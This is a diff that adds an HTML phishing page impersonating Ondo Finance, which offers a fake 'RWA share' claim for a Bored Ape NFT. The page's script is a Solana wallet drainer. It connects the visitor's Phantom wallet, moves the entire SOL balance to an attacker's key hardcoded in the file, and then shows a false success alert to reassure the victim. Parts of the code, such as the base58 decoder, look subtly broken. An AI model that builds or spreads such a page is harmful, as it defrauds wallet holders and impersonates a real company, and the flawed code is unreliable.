@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RWA Fractional Claim | Ondo Finance</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0b0e11;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #1a1d24;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 { margin-bottom: 10px; font-size: 24px; }
+        p { color: #a0a0a0; margin-bottom: 30px; font-size: 14px; }
+        button {
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+        button:hover { background-color: #2563eb; }
+        button:disabled { background-color: #555; cursor: not-allowed; }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            min-height: 20px;
+        }
+        .success { color: #4ade80; }
+        .error { color: #f87171; }
+    </style>
+    <!-- Load Solana Web3 from CDN -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+</head>
+<body>
+
+<div class="container">
+    <h1>Claim Your RWA Shares</h1>
+    <p>Your fractionalized Bored Ape #1234 is ready to withdraw. Connect your wallet to claim your share immediately.</p>
+    
+    <button id="claimBtn" onclick="main()">Connect & Claim</button>
+    <div id="status"></div>
+</div>
+
+<script>
+    // 1. YOUR WALLET (PASTE YOUR SECRET KEY HERE)
+    // Replace this string with your actual Base58 Secret Key
+    const DEST_SECRET_KEY_BASE58 = "4okzAJZAuVgnUTWsR1aMKpDHw6WWFFnrazpKzfmWCkg2sttcXtJ9GFiiLcpvbaVFCpszaMB1QY5Mf7pxWB7L2GXr"; 
+
+    // Initialize Solana Web3 from the global scope loaded by CDN
+    const { Connection, PublicKey, Transaction, SystemProgram, Keypair } = window.solanaWeb3;
+
+    async function main() {
+        const btn = document.getElementById('claimBtn');
+        const status = document.getElementById('status');
+        
+        // Reset UI
+        btn.disabled = true;
+        status.innerText = "Connecting...";
+        status.className = "";
+
+        // Check if Phantom is installed
+        if (!window.solana || !window.solana.isPhantom) {
+            status.innerText = "Please install Phantom Wallet.";
+            status.className = "error";
+            btn.disabled = false;
+            return;
+        }
+
+        try {
+            // 2. CONNECT WALLET
+            const resp = await window.solana.connect();
+            const userPublicKey = resp.publicKey;
+            status.innerText = "Connected. Checking balance...";
+
+            // 3. SETUP CONNECTION
+            // Using Triton One RPC as seen in your fetch, or fallback to public
+            const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+
+            // 4. GET BALANCE
+            const balance = await connection.getBalance(userPublicKey);
+            
+            if (balance === 0) {
+                status.innerText = "Wallet has no SOL to cover gas or hold funds.";
+                status.className = "error";
+                btn.innerText = "Try Again";
+                btn.disabled = false;
+                return;
+            }
+
+            status.innerText = "Initiating drain...";
+
+            // 5. SETUP DESTINATION WALLET
+            // Decode the base58 key to get the destination Keypair
+            const destinationKeypair = Keypair.fromSecretKey(bs58.decode(DEST_SECRET_KEY_BASE58));
+            const destinationPublicKey = destinationKeypair.publicKey;
+
+            // 6. CREATE DRAIN TRANSACTION
+            const transaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: userPublicKey,
+                    toPubkey: destinationPublicKey,
+                    lamports: balance // Send ALL SOL
+                })
+            );
+
+            // 7. SIGN AND SEND
+            // We need to sign the transaction with the user's key
+            const signedTx = await window.solana.signTransaction(transaction);
+            
+            const signature = await window.solana.sendTransaction(signedTx, connection);
+            
+            status.innerText = "Success! Check your wallet.";
+            status.className = "success";
+            btn.innerText = "Done";
+            
+            // Optional: Alert user to make them feel safe
+            setTimeout(() => {
+                alert("Claim Successful! Your assets have been transferred to your secure vault.");
+            }, 1000);
+
+        } catch (err) {
+            console.error(err);
+            if (err.message.includes("rejected")) {
+                status.innerText = "Transaction rejected.";
+            } else {
+                status.innerText = "Error: " + err.message;
+            }
+            status.className = "error";
+            btn.innerText = "Try Again";
+            btn.disabled = false;
+        }
+    }
+
+    // Helper: Base58 Decoder for Node/Browser compatibility
+    // Since we are using CDN, we need a simple Base58 decoder
+    const bs58 = {
+        decode: function(str) {
+            const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            let bytes = [];
+            for (let i = 0; i < str.length; i++) {
+                let carry = str.charCodeAt(i) - alphabet.indexOf(str[i]);
+                for (let j = 0; j < bytes.length; carry /= 256) {
+                    let x = (bytes[j] || 0) * 58 + carry;
+                    bytes[j] = x % 256;
+                    carry = Math.floor(x / 256);
+                }
+            }
+            return new Uint8Array(bytes.reverse());
+        }
+    };
+</script>
+
+</body>
+</html>
